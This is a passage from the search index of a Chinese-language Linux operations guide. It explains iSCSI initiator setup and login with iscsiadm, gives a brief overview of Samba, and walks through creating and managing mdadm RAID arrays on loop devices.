\u200b\u5217\u51fa\u200b\u53d1\u73b0\u200b\u7684\u200b target\n127.0.0.1:3260,1 iqn.2024-03.org.example.201:test-target\n</code></pre> <p>iSCSI node</p> <p>Node \u200b\u5728\u200b iSCSI \u200b\u4e2d\u662f\u200b\u4ee3\u8868\u200b target \u200b\u548c\u200b initiator \u200b\u7684\u200b\u5355\u4f4d\u200b\u3002Initiator node \u200b\u5c31\u662f\u200b\u53d1\u8d77\u200b\u8fde\u63a5\u200b\u7684\u200b\u4e00\u7aef\u200b\uff08\u200b\u5ba2\u6237\u7aef\u200b\uff09\uff0ctarget node \u200b\u5c31\u662f\u200b\u63d0\u4f9b\u200b\u5b58\u50a8\u8d44\u6e90\u200b\u7684\u200b\u4e00\u7aef\u200b\uff08\u200b\u670d\u52a1\u7aef\u200b\uff09\u3002\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u5728\u200b <code>iscsiadm</code> \u200b\u7684\u200b\u64cd\u4f5c\u200b\u4e2d\u200b\uff0c<code>node</code> \u200b\u5c31\u200b\u4ee3\u8868\u200b target\u3002</p> <p>\u200b\u7b2c\u4e8c\u6b65\u200b\u662f\u200b\u300c\u200b\u767b\u5f55\u200b\u300d\u3002\u200b\u4f46\u662f\u200b\u76f4\u63a5\u200b\u767b\u5f55\u200b\u4f1a\u200b\u5403\u200b\u5230\u200b\u95ed\u95e8\u7fb9\u200b\uff1a</p> <pre><code>$ sudo iscsiadm -m node --targetname iqn.2024-03.org.example.201:test-target --portal 127.0.0.1:3260 --login\nLogging in to [iface: default, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260]\niscsiadm: Could not login to [iface: default, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260].\niscsiadm: initiator reported error (24 - iSCSI login failed due to authorization failure)\niscsiadm: Could not log into all portals\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u9700\u8981\u200b\u8ba9\u200b\u670d\u52a1\u7aef\u200b\u6388\u6743\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b iqn\u3002<code>/etc/iscsi/initiatorname.iscsi</code> \u200b\u5305\u542b\u200b\u4e86\u200b\u5ba2\u6237\u7aef\u200b\u81ea\u5df1\u200b\u7684\u200b iqn \u200b\u4fe1\u606f\u200b\uff08\u200b\u6ce8\u610f\u200b\u6bcf\u4e2a\u200b\u5ba2\u6237\u7aef\u200b\u7684\u200b iqn \u200b\u90fd\u200b\u4e0d\u200b\u4e00\u6837\u200b\uff0c\u200b\u4e0d\u8981\u200b\u6284\u200b\u4f8b\u5b50\u200b\u91cc\u200b\u7684\u200b iqn\uff01\uff09\u3002</p> <pre><code>$ sudo cat /etc/iscsi/initiatorname.iscsi\n## DO NOT EDIT OR REMOVE THIS FILE!\n## If you remove this file, the iSCSI daemon will not start.\n## If you change the InitiatorName, existing access control lists\n## may reject this initiator.  The InitiatorName must be unique\n## for each iSCSI initiator.  Do NOT duplicate iSCSI InitiatorNames.\nInitiatorName=iqn.1993-08.org.debian:01:a6a4d4f7356f\n</code></pre> <p>\u200b\u5728\u200b\u670d\u52a1\u7aef\u200b\u6388\u6743\u200b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u767b\u5f55\u200b\u4e86\u200b\uff1a</p> <pre><code>$ sudo iscsiadm -m node --targetname iqn.2024-03.org.example.201:test-target --portal 127.0.0.1:3260 --login\nLogging in to [iface: default, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260]\nLogin to [iface: default, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260] successful.\n</code></pre> <p>\u200b\u65b0\u200b\u8bbe\u5907\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u591a\u79cd\u200b\u65b9\u5f0f\u200b\u786e\u8ba4\u200b\uff1a</p> <pre><code>$ # session \u200b\u4ee3\u8868\u200b\u4e86\u200b initiator \u200b\u548c\u200b target \u200b\u7684\u200b\u4e00\u4e2a\u200b\u8fde\u63a5\u200b\n$ # \u200b\u4e0b\u9762\u200b\u7684\u200b\u547d\u4ee4\u200b\u5217\u51fa\u200b\u4e86\u200b\u6240\u6709\u200b session \u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7528\u200b -P 3 \u200b\u4f7f\u5f97\u200b\u8f93\u51fa\u200b\u66f4\u200b\u8be6\u7ec6\u200b\n$ sudo iscsiadm -m session -P 3\niSCSI Transport Class version 2.0-870\nversion 2.1.8\nTarget: iqn.2024-03.org.example.201:test-target (non-flash)\n\uff08\u200b\u7565\u200b\uff09\n            Attached scsi disk sda      State: running\n$ # \u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5bf9\u5e94\u200b\u8bbe\u5907\u200b\u4e3a\u200b sda\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b lsblk \u200b\u786e\u8ba4\u200b\n$ lsblk\nNAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nsda      8:0    0     1G  0 disk \nsr0     11:0    1 932.3M  0 rom  \nvda    254:0    0    50G  0 disk \n\u2514\u2500vda1 254:1    0    50G  0 part /\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4e3a\u4e86\u200b\u7ef4\u62a4\u200b\u76ee\u7684\u200b\u9700\u8981\u200b logout\uff1a</p> <pre><code>$ sudo iscsiadm -m node --targetname iqn.2024-03.org.example.201:test-target --logout all\nLogging out of session [sid: 2, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260]\nLogout of [sid: 2, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260] successful\n</code></pre> <p>\u200b\u6709\u65f6\u5019\u200b\uff0c\u200b\u670d\u52a1\u7aef\u200b\u4f1a\u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b LUN\uff0c\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u5fc5\u8981\u200b\u65ad\u5f00\u8fde\u63a5\u200b\u518d\u91cd\u200b\u8fde\u200b\uff08\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u670d\u52a1\u200b\u4e2d\u65ad\u200b\uff09\u3002 \u200b\u5ba2\u6237\u7aef\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>iscsiadm</code> \u200b\u7684\u200b <code>--rescan</code> \u200b\u9009\u9879\u200b\u6765\u200b\u91cd\u65b0\u200b\u626b\u63cf\u200b\u8bbe\u5907\u200b\uff1a</p> <pre><code>$ sudo iscsiadm -m session --rescan\nRescanning session [sid: 4, target: iqn.2024-03.org.example.201:test-target, portal: 127.0.0.1,3260]\n$ lsblk\nNAME   MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS\nsda      8:0    0     1G  0 disk \nsdb      8:16   0     1G  0 disk \nsr0     11:0    1 932.3M  0 rom  \nvda    254:0    0    50G  0 disk \n\u2514\u2500vda1 254:1    0    50G  0 part \n$ # \u200b\u591a\u51fa\u200b\u4e86\u200b\u65b0\u200b\u6dfb\u52a0\u200b\u7684\u200b sdb\n</code></pre> <p>iSCSI session</p> <p>\u200b\u5f53\u200b initiator \u200b\u8fde\u63a5\u200b\u5230\u200b target \u200b\u540e\u200b\uff0c\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b iSCSI session\uff0c\u200b\u540c\u4e2a\u200b initiator \u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u540c\u4e2a\u200b target \u200b\u521b\u5efa\u200b\u591a\u4e2a\u200b session\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>iscsiadm -m session</code> \u200b\u67e5\u770b\u200b\u5f53\u524d\u200b\u6240\u6709\u200b\u7684\u200b session\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u70b9\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\u5f00\u673a\u200b\u65f6\u200b\u7684\u200b\u914d\u7f6e\u200b\uff0c\u200b\u867d\u7136\u200b <code>iscsid.service</code> \u200b\u4f1a\u200b\u5728\u200b\u5f00\u673a\u200b\u65f6\u200b\u81ea\u52a8\u200b\u542f\u7528\u200b\uff0c\u200b\u4f46\u662f\u200b\u767b\u5f55\u200b\u64cd\u4f5c\u200b\u9ed8\u8ba4\u200b\u4e0d\u662f\u200b\u81ea\u52a8\u200b\u7684\u200b\u3002 \u200b\u8fd9\u200b\u4e00\u70b9\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u786e\u8ba4\u200b\uff1a</p> <pre><code>$ cat /etc/iscsi/iscsid.conf | grep node.startup\n# node.startup = automatic\nnode.startup = manual\n$ sudo cat /etc/iscsi/nodes/iqn.2024-03.org.example.201\\:test-target/127.0.0.1\\,3260\\,1/default | grep startup\nnode.startup = manual\nnode.conn[0].startup = manual\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u547d\u4ee4\u200b\u4fee\u6539\u200b\u76f8\u5173\u200b\u914d\u7f6e\u200b\uff08\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff09\uff1a</p> <pre><code>iscsiadm -m node -T iqn.2024-03.org.example.201:test-target -p 127.0.0.1 -o update -n node.startup -v automatic\niscsiadm -m node -T iqn.2024-03.org.example.201:test-target -p 127.0.0.1 -o update -n node.conn[0].startup -v automatic\n</code></pre> <p><code>open-iscsi.service</code> \u200b\u5728\u200b\u5f00\u673a\u200b\u65f6\u4f1a\u200b\u81ea\u52a8\u200b\u767b\u5f55\u200b\u6240\u6709\u200b\u914d\u7f6e\u200b\u597d\u200b\u7684\u200b target\u3002</p> <p>\u200b\u907f\u514d\u200b\u4fee\u6539\u200b\uff08override\uff09<code>open-iscsi.service</code></p> <p>\u200b\u5728\u200b\u6309\u7167\u200b\u4ee5\u4e0a\u200b\u65b9\u6cd5\u200b\u6070\u5f53\u200b\u914d\u7f6e\u200b <code>startup</code> \u200b\u4e3a\u200b <code>automatic</code> \u200b\u540e\u200b\uff0c<code>open-iscsi.service</code> \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u542f\u52a8\u200b\u8fd9\u4e9b\u200b node\u3002\u200b\u4e00\u4e9b\u200b\u8d44\u6599\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5efa\u8bae\u200b\u901a\u8fc7\u200b <code>systemctl edit open-iscsi.service</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u8986\u76d6\u200b\u6389\u200b\u5176\u200b\u539f\u5148\u200b\u7684\u200b <code>ExecStart</code>\uff0c\u200b\u5e76\u4e14\u200b\u81ea\u884c\u6dfb\u52a0\u200b <code>iscsiadm</code> \u200b\u767b\u5f55\u200b\u6307\u4ee4\u200b\u3002\u200b\u8bf7\u200b\u907f\u514d\u200b\u8fd9\u4e48\u200b\u505a\u200b\u3002</p> <p>\u200b\u91cd\u542f\u200b <code>open-iscsi.service</code> \u200b\u4f1a\u200b logout \u200b\u5f53\u524d\u200b\u6302\u8f7d\u200b\u7684\u200b\u6240\u6709\u200b iSCSI \u200b\u5757\u200b\u8bbe\u5907\u200b</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u200b\u4e00\u4e0b\u200b\u8fd9\u4e2a\u200b\u670d\u52a1\u200b\u5728\u200b\u5f00\u542f\u200b\u4e0e\u200b\u5173\u95ed\u200b\u65f6\u200b\u7684\u200b\u884c\u4e3a\u200b\uff1a</p> <pre><code>ExecStart=/sbin/iscsiadm -m node --loginall=automatic\nExecStart=/lib/open-iscsi/activate-storage.sh\nExecStop=/lib/open-iscsi/umountiscsi.sh\nExecStop=/bin/sync\nExecStop=/lib/open-iscsi/logout-all.sh\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b <code>ExecStop</code> \u200b\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b logout all \u200b\u7684\u200b\u64cd\u4f5c\u200b\uff0clogout \u200b\u540e\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u5f53\u524d\u200b\u6240\u6709\u200b\u4f7f\u7528\u200b\u5bf9\u5e94\u200b iSCSI \u200b\u5757\u200b\u8bbe\u5907\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002\u200b\u5982\u679c\u200b\u4fee\u6539\u200b\u4e86\u200b\u767b\u5f55\u200b\u914d\u7f6e\u200b\uff08\u200b\u4f8b\u5982\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u65b0\u200b node \u200b\u5e76\u200b\u8bbe\u7f6e\u200b\u4e3a\u4e86\u200b\u81ea\u52a8\u200b\u767b\u5f55\u200b\uff09\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u73b0\u6709\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u53d1\u751f\u200b\u9519\u8bef\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u53ea\u200b\u8fd0\u884c\u200b\u8be5\u200b\u670d\u52a1\u200b <code>ExecStart</code> \u200b\u7684\u200b\u90e8\u5206\u200b\u3002\u200b\u5bf9\u4e8e\u200b\u5df2\u7ecf\u200b\u521b\u5efa\u200b\u4e86\u200b session \u200b\u7684\u200b node\uff0c<code>iscsiadm</code> \u200b\u4e0d\u4f1a\u200b\u5c1d\u8bd5\u200b\u91cd\u590d\u200b\u8fde\u63a5\u200b\uff1a</p> <pre><code>$ sudo iscsiadm -m node --loginall=automatic\niscsiadm: default: 1 session requested, but 1 already present.\niscsiadm: Could not log into all portals\n</code></pre> <p>\u200b\u4f18\u5316\u200b\u5efa\u8bae\u200b\uff1a\u200b\u5de8\u578b\u200b\u5e27\u200b</p> <p>\u200b\u5de8\u578b\u200b\u5e27\u200b\uff08jumbo frame\uff09\u200b\u662f\u200b\u6307\u200b MTU \u200b\u5927\u4e8e\u200b 1500 \u200b\u7684\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u4e00\u822c\u200b\u4e3a\u200b 9000\u3002\u200b\u5982\u679c\u200b\u94fe\u8def\u200b\u8bbe\u5907\u200b\u5747\u200b\u652f\u6301\u200b\u5de8\u578b\u200b\u5e27\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u5728\u200b iSCSI \u200b\u90e8\u7f72\u200b\u65f6\u200b\u542f\u7528\u200b\u5de8\u578b\u200b\u5e27\u200b\uff0c\u200b\u51cf\u5c0f\u200b\u4ee5\u592a\u7f51\u200b\u7684\u200b\u989d\u5916\u200b\u5f00\u9500\u200b\uff0c\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\u3002</p>"},{"location":"ops/storage/network/#samba","title":"Samba","text":"<p>Samba \u200b\u5b9e\u73b0\u200b\u4e86\u200b SMB\uff08Server Message Block\uff09\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u662f\u200b\u5728\u200b\u5bb6\u7528\u200b\u573a\u666f\u200b\u4e0b\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u7f51\u7edc\u534f\u8bae\u200b\u4e4b\u4e00\u200b\u3002\u200b\u672c\u200b\u90e8\u5206\u200b\u4e3b\u8981\u200b\u5173\u6ce8\u200b\u6587\u4ef6\u5171\u4eab\u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u533f\u540d\u200b\u8bbf\u95ee\u200b\u4e0e\u200b\u7528\u6237\u540d\u200b\u3001\u200b\u5bc6\u7801\u200b\u8bbf\u95ee\u200b\u3002\u200b\u6709\u5173\u200b\u670d\u52a1\u200b\u53d1\u73b0\u200b\uff08\u200b\u8ba9\u200b\u5c40\u57df\u7f51\u200b\u5185\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u673a\u200b\u81ea\u52a8\u200b\u627e\u5230\u200b Samba \u200b\u5171\u4eab\u200b\u7684\u200b\u76ee\u5f55\u200b\uff09\u200b\u76f8\u5173\u200b\u5185\u5bb9\u200b\uff0c\u200b\u8bf7\u200b\u53c2\u8003\u200b Zeroconf \u200b\u7684\u200b\u300c\u200b\u670d\u52a1\u200b\u53d1\u73b0\u200b\u300d\u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u5bb6\u7528\u200b\u573a\u666f\u200b\u4e0b\u200b\u7684\u200b\u5176\u4ed6\u200b\u534f\u8bae\u200b</p> <p>\u200b\u9664\u4e86\u200b SMB\uff08Samba\uff09\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4f7f\u7528\u200b FTP\u3001WebDAV\u3001UPnP/DLNA \u200b\u7b49\u200b\u65b9\u5f0f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u6587\u4ef6\u200b\u6216\u200b\u5a92\u4f53\u200b\u7684\u200b\u5171\u4eab\u200b\u3002\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\uff0c\u200b\u57fa\u4e8e\u200b HTTP(S) \u200b\u7684\u200b WebDAV \u200b\u662f\u200b\u66f4\u52a0\u200b\u7b80\u5355\u200b\u6613\u7528\u200b\u7684\u200b\u9009\u62e9\u200b\u3002\u200b\u8bf8\u5982\u200b Nextcloud\u3001copyparty \u200b\u7b49\u200b\u5de5\u5177\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u6210\u719f\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u5982\u200b\u6709\u200b\u9700\u8981\u200b\u53ef\u4ee5\u200b\u81ea\u884c\u200b\u641c\u7d22\u200b\u76f8\u5173\u200b\u7684\u200b\u914d\u7f6e\u200b\u65b9\u6cd5\u200b\u3002</p>"},{"location":"ops/storage/raid/","title":"RAID","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u672c\u6587\u200b\u4ecb\u7ecd\u200b\u5e38\u89c1\u200b\u7684\u200b RAID \u200b\u65b9\u6848\u200b\u7684\u200b\u4f7f\u7528\u200b\u4e0e\u200b\u7ef4\u62a4\u200b\u3002 \u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b LVM \u200b\u521b\u5efa\u200b RAID \u200b\u7684\u200b\u65b9\u6cd5\u200b\u8bf7\u200b\u53c2\u8003\u200b LVM\uff1b \u200b\u4f7f\u7528\u200b ZFS \u200b\u521b\u5efa\u200b RAID \u200b\u7684\u200b\u65b9\u6cd5\u200b\u8bf7\u200b\u53c2\u8003\u200b ZFS\u3002</p> <p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4e0d\u200b\u6d89\u53ca\u200b FakeRAID\uff08\u200b\u4f8b\u5982\u200b Intel Rapid Storage Technology\uff09\u3002 \u200b\u5efa\u8bae\u200b\u9605\u8bfb\u200b\u4ee5\u4e0b\u5185\u5bb9\u200b\u524d\u200b\uff0c\u200b\u5148\u200b\u9605\u8bfb\u200b LVM \u200b\u4e2d\u200b\u4e0e\u200b RAID \u200b\u76f8\u5173\u200b\u7684\u200b\u90e8\u5206\u200b\u3002</p>"},{"location":"ops/storage/raid/#mdadm","title":"mdadm","text":"<p>mdadm \u200b\u662f\u200b Linux \u200b\u4e0a\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u8f6f\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\u3002 \u200b\u5728\u200b\u4e0b\u9762\u200b\u7684\u200b\u6b65\u9aa4\u200b\u4e2d\u200b\uff0c\u200b\u4e0e\u200b LVM \u200b\u4e00\u7ae0\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6211\u4eec\u200b\u4f7f\u7528\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u521b\u5efa\u200b\u4e09\u4e2a\u200b\u5757\u200b\u8bbe\u5907\u200b\u3002 \u200b\u540c\u6837\u200b\u5730\u200b\uff0c\u200b\u5728\u200b\u5b9e\u9645\u200b\u4f7f\u7528\u200b\u4e2d\u200b\uff0c\u200b\u5f3a\u70c8\u5efa\u8bae\u200b\u5148\u200b\u5206\u533a\u200b\u518d\u200b\u521b\u5efa\u200b RAID\u3002</p> <pre><code>$ truncate -s 1G md0.img md1.img md2.img\n$ sudo losetup -f --show md0.img\n/dev/loop0\n$ sudo losetup -f --show md1.img\n/dev/loop1\n$ sudo losetup -f --show md2.img\n/dev/loop2\n</code></pre>"},{"location":"ops/storage/raid/#mdadm-create","title":"\u521b\u5efa\u200b RAID","text":"<p>\u200b\u6211\u4eec\u200b\u5148\u200b\u4ee5\u200b RAID 0 \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u8de8\u200b 3 \u200b\u5757\u200b\u76d8\u200b\u7684\u200b RAID 0\u3002</p> <pre><code>$ sudo mdadm --create /dev/md0 --level=0 --raid-devices=3 /dev/loop0 /dev/loop1 /dev/loop2\nmdadm: Defaulting to version 1.2 metadata\nmdadm: array /dev/md0 started.\n</code></pre> <p>\u200b\u5f97\u5230\u200b\u7684\u200b <code>/dev/md0</code> \u200b\u5c31\u662f\u200b\u521b\u5efa\u200b\u5b8c\u6210\u200b\u7684\u200b RAID \u200b\u5757\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u5927\u5c0f\u200b\u662f\u200b\u7ea6\u200b 3G\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>mdadm --detail</code> \u200b\u67e5\u770b\u200b\u8be6\u7ec6\u4fe1\u606f\u200b\u3002</p> <pre><code>$ sudo mdadm --detail /dev/md0\n/dev/md0:\n           Version : 1.2\n     Creation Time : Wed Feb 21 00:54:02 2024\n        Raid Level : raid0\n        Array Size : 3139584 (2.99 GiB 3.21 GB)\n      Raid Devices : 3\n     Total Devices : 3\n       Persistence : Superblock is persistent\n\n       Update Time : Wed Feb 21 00:54:02 2024\n             State : clean \n    Active Devices : 3\n   Working Devices : 3\n    Failed Devices : 0\n     Spare Devices : 0\n\n            Layout : -unknown-\n        Chunk Size : 512K\n\nConsistency Policy : none\n\n              Name : hostname:0  (local to host hostname)\n              UUID : 119661ca:ff0a76b7:28909e39:18af76dc\n            Events : 0\n\n    Number   Major   Minor   RaidDevice State\n       0       7        0        0      active sync   /dev/loop0\n       1       7        1        1      active sync   /dev/loop1\n       2       7        2        2      active sync   /dev/loop2\n</code></pre> <p>\u200b\u5bf9\u5e94\u200b\u7684\u200b\u72b6\u6001\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>/proc/mdstat</code> \u200b\u67e5\u770b\u200b\uff1a</p> <pre><code>$ cat /proc/mdstat\nPersonalities : [raid6] [raid5] [raid4] [raid1] [raid0] \nmd0 : active raid0 loop2[2] loop1[1] loop0[0]\n      3139584 blocks super 1.2 512k chunks\n\nunused devices: &lt;none&gt;\n</code></pre> <p>\u200b\u4f7f\u7528\u200b <code>--stop</code> \u200b\u9009\u9879\u200b\u505c\u6b62\u200b RAID\uff1a</p> <pre><code>$ sudo mdadm --stop /dev/md0\nmdadm: stopped /dev/md0\n$ ls -lha /dev/md0\nls: cannot access '/dev/md0': No such file or directory\n</code></pre> <p>\u200b\u5728\u200b stop \u200b\u4e4b\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u518d\u200b\u6062\u590d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>--assemble</code> \u200b\u9009\u9879\u200b\uff1a</p> <pre><code>$ sudo mdadm --assemble /dev/md0 /dev/loop0 /dev/loop1 /dev/loop2\nmdadm: /dev/md0 has been started with 3 drives.\n$ # \u200b\u6216\u8005\u200b\u4f7f\u7528\u200b --scan \u200b\u53c2\u6570\u200b\uff1a\n$ sudo mdadm --assemble --scan\nmdadm: /dev/md/0 has been started with 3 drives.\n</code></pre> <p>\u200b\u5c06\u200b\u8fd9\u4e2a\u200b RAID 0 \u200b\u62c6\u6389\u200b\uff0c\u200b\u7136\u540e\u200b\u8bd5\u8bd5\u200b\u7ec4\u5efa\u200b RAID 1\u3001RAID 5\uff1a</p> <pre><code>$ # RAID 1\n$ sudo mdadm --stop /dev/md0\nmdadm: stopped /dev/md0\n$ sudo mdadm --misc --zero-superblock /dev/loop0 /dev/loop1 /dev/loop2\n$ sudo mdadm --create /dev/md0 --level=1 --raid-devices=3 /dev/loop0 /dev/loop1 /dev/loop2\nmdadm: Note: this array has metadata at the start and\n    may not be suitable as a boot device.  If you plan to\n    store '/boot' on this device please ensure that\n    your boot-loader understands md/v1.x metadata, or use\n    --metadata=0.90\nContinue creating array? y\nmdadm: Defaulting to version 1.2 metadata\nmdadm: array /dev/md0 started.\n$ # RAID 5\n$ sudo mdadm --stop /dev/md0\nmdadm: stopped /dev/md0\n$ sudo mdadm --misc --zero-superblock /dev/loop0 /dev/loop1 /dev/loop2\n$ sudo mdadm --create /dev/md0 --level=5 --raid-devices=3 /dev/loop0 /dev/loop1 /dev/loop2\nmdadm: Defaulting to version 1.2 metadata\nmdadm: array /dev/md0 started.\n</code></pre> <p>\u200b\u5982\u679c\u200b\u5728\u200b\u91cd\u65b0\u200b\u521b\u5efa\u200b mdadm \u200b\u9635\u5217\u200b\u4e4b\u524d\u200b\u4e0d\u200b\u6e05\u7a7a\u200b superblock\uff0c\u200b\u4f1a\u200b\u8f93\u51fa\u200b\u7c7b\u4f3c\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u8b66\u544a\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>mdadm: /dev/loop0 appears to be part of a raid array:\n       level=raid0 devices=3 ctime=Wed Feb 21 00:54:02 2024\nmdadm: /dev/loop1 appears to be part of a raid array:\n       level=raid0 devices=3 ctime=Wed Feb 21 00:54:02 2024\nmdadm: /dev/loop2 appears to be part of a raid array:\n       level=raid0 devices=3 ctime=Wed Feb 21 00:54:02 2024\n</code></pre> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5c3d\u7ba1\u200b\u8fd9\u91cc\u200b\u4e0d\u200b\u5c55\u793a\u200b RAID10 \u200b\u7684\u200b\u521b\u5efa\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u4f46\u662f\u200b mdadm \u200b\u7684\u200b RAID10 \u200b\u6d89\u53ca\u200b\u5230\u200b near, far \u200b\u548c\u200b offset \u200b\u4e09\u79cd\u200b\u5e03\u5c40\u200b\u7684\u200b\u9009\u62e9\u200b\u3002 \u200b\u8be6\u7ec6\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u53ef\u200b\u53c2\u8003\u200b md(4) \u200b\u7684\u200b \"About the RAID10 Layout Examples\" \u200b\u90e8\u5206\u200b\u3002</p> <p>\u200b\u6709\u5173\u200b raid456 \u200b\u7684\u200b\u6027\u80fd\u200b\u4e89\u8bae\u200b</p> <p>\u200b\u5185\u6838\u200b md \u200b\u7684\u200b raid456 \u200b\u6a21\u5757\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b 4K \"stripe\"\uff0c\u200b\u6240\u6709\u200b\u7684\u200b\u5757\u200b IO \u200b\u64cd\u4f5c\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u5148\u200b\u88ab\u200b\u5206\u6210\u200b 4K \u200b\u7684\u200b\u5757\u200b\uff0c commit \u200b\u5230\u200b\u8bbe\u5907\u200b\u4e0a\u540e\u200b\u518d\u200b\u5408\u5e76\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5e76\u4e14\u200b\u76ee\u524d\u200b\u5408\u5e76\u200b\u64cd\u4f5c\u200b\u65e0\u6cd5\u200b\u6b63\u786e\u5904\u7406\u200b trim \u200b\u6307\u4ee4\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u200b\u5bfc\u81f4\u200b\u4e86\u200b\u5bf9\u200b raid4/5/6 \u200b\u8fdb\u884c\u200b trim \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5168\u76d8\u200b trim \u200b\u4f1a\u200b\u88ab\u200b\u62c6\u200b\u5206\u6210\u200b\u5927\u91cf\u200b\u7684\u200b 4k trim\uff0c\u200b\u4ece\u800c\u200b\u5bfc\u81f4\u200b trim \u200b\u5361\u4f4f\u200b\u3002\u200b\u5728\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\u65f6\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u53d1\u73b0\u200b\u6027\u80fd\u200b\u4e0d\u53ca\u200b\u9884\u671f\u200b\u3002</p> <p>\u200b\u76f8\u5173\u200b\u90ae\u4ef6\u200b\u8ba8\u8bba\u200b\uff1a</p> <ul> <li>https://lore.kernel.org/linux-block/ED5B1993-9D44-4B9C-A7DF-72BD2375A216@gmail.com/T/</li> <li>https://lore.kernel.org/all/5EAED86C53DED2479E3E145969315A2385841062@UMECHPA7B.easf.csd.disa.mil/T/</li> <li>https://lore.kernel.org/all/20220207152735.27381-1-vverma@digitalocean.com/</li> </ul> <p>\u200b\u611f\u8c22\u200b @shankerwangmiao 